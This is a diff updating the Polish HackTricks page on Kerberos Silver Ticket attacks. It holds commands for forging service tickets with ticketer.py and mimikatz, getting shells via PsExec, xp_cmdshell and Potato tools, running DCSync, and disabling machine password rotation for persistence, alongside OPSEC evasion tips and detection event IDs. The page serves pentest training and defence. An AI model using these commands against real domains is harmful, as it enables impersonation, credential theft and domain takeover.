@@ -6,22 +6,22 @@
 
 ## Silver ticket
 
-Atak **Silver Ticket** polega na wykorzystywaniu ticketów usługowych w środowiskach Active Directory (AD). Ta metoda opiera się na **uzyskaniu NTLM hasha konta usługi**, takiego jak konto komputera, aby sfałszować Ticket Granting Service (TGS) ticket. Za pomocą tego sfałszowanego ticketu atakujący może uzyskać dostęp do konkretnych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uprawnień administracyjnych. Należy podkreślić, że użycie kluczy AES do podrabiania ticketów jest bezpieczniejsze i trudniej wykrywalne.
+Atak **Silver Ticket** polega na wykorzystaniu service tickets w środowiskach Active Directory (AD). Metoda ta opiera się na **pozyskaniu hasha NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu Ticket Granting Service (TGS). Za pomocą takiego sfałszowanego biletu atakujący może uzyskać dostęp do określonych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że używanie kluczy AES do fałszowania biletów jest bezpieczniejsze i trudniejsze do wykrycia.<sup>[[1]](#references)[[2]](#references)</sup>
 
 > [!WARNING]
-> Silver Tickets są mniej wykrywalne niż Golden Tickets, ponieważ wymagają tylko **hasha konta usługi**, a nie konta krbtgt. Jednak są ograniczone do konkretnej usługi, którą celują. Ponadto, po prostu kradzież hasła użytkownika.
-> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
+> Silver Tickets są trudniejsze do wykrycia niż Golden Tickets, ponieważ wymagają jedynie **hasha konta usługi**, a nie konta krbtgt. Są jednak ograniczone do konkretnej usługi, w którą celują. Co więcej, wystarczy ukraść hasło użytkownika.
+Co więcej, jeśli przejmiesz **hasło konta z SPN**, możesz użyć tego hasła do utworzenia Silver Ticket, podszywając się pod dowolnego użytkownika w tej usłudze.
 
-### Modern Kerberos changes (AES-only domains)
+### Współczesne zmiany w Kerberos (domeny obsługujące wyłącznie AES)
 
-- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
-- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
-- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
-- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.
+- Aktualizacje Windows rozpoczynające się od **8 listopada 2022 r. (KB5021131)** domyślnie ustawiają dla service tickets klucze sesji AES, gdy jest to możliwe, i stopniowo wycofują RC4. Oczekuje się, że do połowy 2026 r. kontrolery domeny będą dostarczane z domyślnie **wyłączonym** RC4, dlatego poleganie na hashach NTLM/RC4 w przypadku silver tickets będzie coraz częściej kończyć się błędem `KRB_AP_ERR_MODIFIED`. Zawsze wyodrębniaj **klucze AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) dla docelowego konta usługi.<sup>[[5]](#references)</sup>
+- Jeśli dla konta usługi `msDS-SupportedEncryptionTypes` ograniczono szyfrowanie do AES, musisz sfałszować bilet za pomocą `/aes256` lub `-aesKey`; RC4 (`/rc4` lub `-nthash`) nie zadziała, nawet jeśli posiadasz hash NTLM.<sup>[[6]](#references)</sup>
+- Konta gMSA/kont komputerów zmieniają klucze co 30 dni; przed sfałszowaniem biletu zrzutuj **bieżący klucz AES** z LSASS, Secretsdump/NTDS lub DCsync.
+- OPSEC: domyślny czas ważności biletu w narzędziach często wynosi **10 lat**; ustaw realistyczny czas trwania (np. `-duration 600` minut), aby uniknąć wykrycia z powodu nietypowo długiego okresu ważności.<sup>[[6]](#references)</sup>
 
-For ticket crafting, different tools are employed based on the operating system:
+Do tworzenia biletów używa się różnych narzędzi, zależnie od systemu operacyjnego:
 
-### On Linux
+### Na Linuxie
 ```bash
 # Forge with AES instead of RC4 (supports gMSA/machine accounts)
 python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -57,11 +57,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Usługa CIFS jest wyróżniona jako powszechny cel do uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, mogą być również wykorzystane do wykonywania zadań i zapytań WMI.
+Usługa CIFS jest często wskazywana jako cel umożliwiający dostęp do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystywane do wykonywania zadań i zapytań WMI.
 
 ### Przykład: usługa MSSQL (MSSQLSvc) + Potato do SYSTEM
 
-Jeśli posiadasz NTLM hash (lub AES key) konta SQL service account (np. sqlsvc), możesz sfałszować TGS dla MSSQL SPN i impersonate dowolnego użytkownika względem usługi SQL. Stamtąd włącz xp_cmdshell, aby uruchamiać polecenia jako SQL service account. Jeśli ten token ma SeImpersonatePrivilege, chain a Potato, aby elevate do SYSTEM.
+Jeśli posiadasz hash NTLM (lub klucz AES) konta usługi SQL (np. sqlsvc), możesz sfałszować TGS dla SPN MSSQL i podszyć się pod dowolnego użytkownika w usłudze SQL. Następnie włącz `xp_cmdshell`, aby wykonywać polecenia jako konto usługi SQL. Jeśli ten token ma uprawnienie SeImpersonatePrivilege, połącz Potato, aby uzyskać uprawnienia SYSTEM.<sup>[[4]](#references)</sup>
 ```bash
 # Forge a silver ticket for MSSQLSvc (AES example)
 python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -72,20 +72,20 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Jeśli powstały kontekst ma SeImpersonatePrivilege (często prawda dla kont usługowych), użyj wariantu Potato, aby uzyskać SYSTEM:
+- Jeśli uzyskany kontekst ma SeImpersonatePrivilege (często dotyczy to kont usług), użyj wariantu Potato, aby uzyskać uprawnienia SYSTEM:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-More details on abusing MSSQL and enabling xp_cmdshell:
+Więcej informacji na temat nadużywania MSSQL i włączania xp_cmdshell:
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Potato techniques overview:
+Przegląd technik Potato:
 
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
@@ -93,46 +93,46 @@ Potato techniques overview:
 
 ## Dostępne usługi
 
-| Service Type                               | Service Silver Tickets                                                     |
+| Typ usługi                                 | Usługi Silver Tickets                                                      |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu także:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach możesz po prostu poprosić o: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego również:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows File Share, również psexec         | CIFS                                                                       |
+| Operacje LDAP, w tym DCSync                | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets ID zdarzeń
+### Silver tickets Event IDs
 
 - 4624: Logowanie konta
 - 4634: Wylogowanie konta
 - 4672: Logowanie administratora
-- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
-- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.
+- **Brak poprzedzających zdarzeń 4768/4769 na DC** dla tego samego klienta/usługi jest częstym wskaźnikiem podrobionego TGS przedstawionego bezpośrednio usłudze.
+- Nienormalnie długi czas ważności biletu lub nieoczekiwany typ szyfrowania (RC4, gdy domena wymusza AES) również wyróżniają się w danych 4769/4624.
 
-## Utrzymywanie dostępu
+## Persistence
 
-Aby zapobiec rotacji hasła maszyn co 30 dni ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` albo możesz ustawić `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na wartość większą niż 30 dni, aby wskazać okres rotacji, kiedy hasło maszyny powinno być zmieniane.
+Aby zapobiec zmianie hasła maszyn co 30 dni, ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` albo ustaw `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na wartość większą niż 30 dni, aby określić okres rotacji, po którym hasło maszyn powinno zostać zmienione.<sup>[[3]](#references)</sup>
 
 ## Abusing Service tickets
 
-W poniższych przykładach załóżmy, że ticket został uzyskany podszywając się pod konto administratora.
+W poniższych przykładach załóżmy, że bilet został pobrany podczas impersonacji konta administratora.
 
 ### CIFS
 
-Dzięki temu ticketowi będziesz mógł uzyskać dostęp do `C$` i `ADMIN$` folderu przez **SMB** (jeśli są udostępnione) i skopiować pliki do części zdalnego systemu plików robiąc coś w stylu:
+Za pomocą tego biletu będzie można uzyskać dostęp do folderów `C$` i `ADMIN$` przez **SMB** (jeśli są udostępnione) oraz kopiować pliki do części zdalnego systemu plików, wykonując po prostu coś takiego:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Będziesz także w stanie uzyskać powłokę na hoście lub wykonać dowolne polecenia za pomocą **psexec**:
+Będziesz również w stanie uzyskać shell wewnątrz hosta lub wykonywać dowolne komendy przy użyciu **psexec**:
 
 
 {{#ref}}
@@ -141,7 +141,7 @@ Będziesz także w stanie uzyskać powłokę na hoście lub wykonać dowolne pol
 
 ### HOST
 
-Dzięki temu uprawnieniu możesz tworzyć zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
+Dzięki temu uprawnieniu możesz tworzyć zaplanowane zadania na zdalnych komputerach i wykonywać dowolne komendy:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -155,7 +155,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Dzięki tym tickets możesz **uruchomić WMI na systemie ofiary**:
+Za pomocą tych ticketów możesz **wykonywać WMI w systemie ofiary**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -174,11 +174,11 @@ Znajdź **więcej informacji o wmiexec** na następującej stronie:
 
 ### HOST + WSMAN (WINRM)
 
-Mając dostęp do komputera przez winrm możesz **uzyskać dostęp** i nawet otrzymać PowerShell:
+Mając dostęp winrm do komputera, możesz **uzyskać do niego dostęp**, a nawet uruchomić PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów łączenia się ze zdalnym hostem przy użyciu winrm**:
+Sprawdź poniższą stronę, aby poznać **więcej sposobów łączenia się ze zdalnym hostem za pomocą winrm**:
 
 
 {{#ref}}
@@ -186,15 +186,15 @@ Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów łącz
 {{#endref}}
 
 > [!WARNING]
-> Zwróć uwagę, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby uzyskać do niego dostęp.
+> Pamiętaj, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby można było uzyskać do niego dostęp.
 
 ### LDAP
 
-Posiadając to uprawnienie, możesz zrzucić bazę danych DC używając **DCSync**:
+Mając to uprawnienie, możesz zrzucić bazę danych DC za pomocą **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Dowiedz się więcej o DCSync** na poniższej stronie:
+**Dowiedz się więcej o DCSync** na następującej stronie:
 
 
 {{#ref}}
@@ -202,15 +202,13 @@ dcsync.md
 {{#endref}}
 
 
-## Źródła
+## Referencje
 
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
-- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
-- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
-- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
-
-
+- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+- [2] [Kerberos (II): Jak zaatakować Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [3] [Proces obsługi hasła konta komputera - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [4] [HTB Sendai – 0xdf: ścieżka Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [5] [KB5021131: hardening Kerberos i wycofanie RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
+- [6] [Aktualne opcje ticketer.py w Impacket (AES/keytab/czas trwania)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
 
 {{#include ../../banners/hacktricks-training.md}}
